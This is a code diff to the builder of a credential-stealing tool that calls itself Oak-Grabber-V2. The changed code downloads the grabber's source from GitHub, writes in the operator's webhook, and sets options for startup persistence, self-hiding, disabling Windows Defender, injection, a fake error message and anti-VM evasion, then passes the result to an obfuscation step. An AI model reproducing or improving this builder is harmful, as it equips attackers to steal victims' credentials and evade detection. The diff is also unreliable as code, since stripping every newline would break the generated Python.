@@ -133,11 +133,43 @@ class WriteConfig:
         """
         Writes the config data to the config file
         """
-        with open("oakv2.py", "r", encoding='utf-8') as main: # :skull:
-            source = main.read().replace("'webhook': 'webhook_here',",f"'webhook': '{self.config['webhook']}',").replace("'Ping_on_run': True,",f"'Ping_on_run': {self.config['Ping_on_run']},").replace(
-                "'Add_to_startup': True,",f"'Add_to_startup': {self.config['Add_to_startup']},").replace("'Self_hide': True,",f"'Self_hide': {self.config['Self_hide']},").replace("'Hide_Console': True,",f"'Hide_Console': {self.config['Hide_Console']},").replace("'Disable_defender': True,",f"'Disable_defender': {self.config['Disable_defender']},").replace("'inject': True,",f"'inject': {self.config['inject']},").replace("'Black_Screen': True,",f"'Black_Screen': {self.config['Black_Screen']},").replace("'Fake_error_message': True,",f"'Fake_error_message': {self.config['Fake_error_message']},").replace("'Antivm': True,",f"'Antivm': {self.config['Antivm']},")
-        with open(self.build_dir+"\\main.py","w", encoding='utf-8') as f:
-            f.write(source)
+        source = requests.get("https://raw.githubusercontent.com/dynastyoak/Oak-Grabber-V2/main/oakv2.py")
+
+        with open(self.build_dir+"\\main.py", "w", encoding="utf-8") as f:
+            content = str(source.content.decode('utf-8')).replace(
+                "'webhook': 'webhook_here',",
+                f"'webhook': '{self.config['webhook']}',"
+            ).replace(
+                "'Ping_on_run': True,",
+                f"'Ping_on_run': {self.config['Ping_on_run']},"
+            ).replace(
+                "'Add_to_startup': True,",
+                f"'Add_to_startup': {self.config['Add_to_startup']},"
+            ).replace(
+                "'Self_hide': True,",
+                f"'Self_hide': {self.config['Self_hide']},"
+            ).replace(
+                "'Hide_Console': True,",
+                f"'Hide_Console': {self.config['Hide_Console']},"
+            ).replace(
+                "'Disable_defender': True,",
+                f"'Disable_defender': {self.config['Disable_defender']},"
+            ).replace(
+                "'inject': True,",
+                f"'inject': {self.config['inject']},"
+            ).replace(
+                "'Black_Screen': True,",
+                f"'Black_Screen': {self.config['Black_Screen']},"
+            ).replace(
+                "'Fake_error_message': True,",
+                f"'Fake_error_message': {self.config['Fake_error_message']},"
+            ).replace(
+                "'Antivm': True,",
+                f"'Antivm': {self.config['Antivm']},"
+            )
+            content = content.replace('\n', '')  # remove newline characters
+            f.write(content)
+
 
 
 class DoObfuscate:
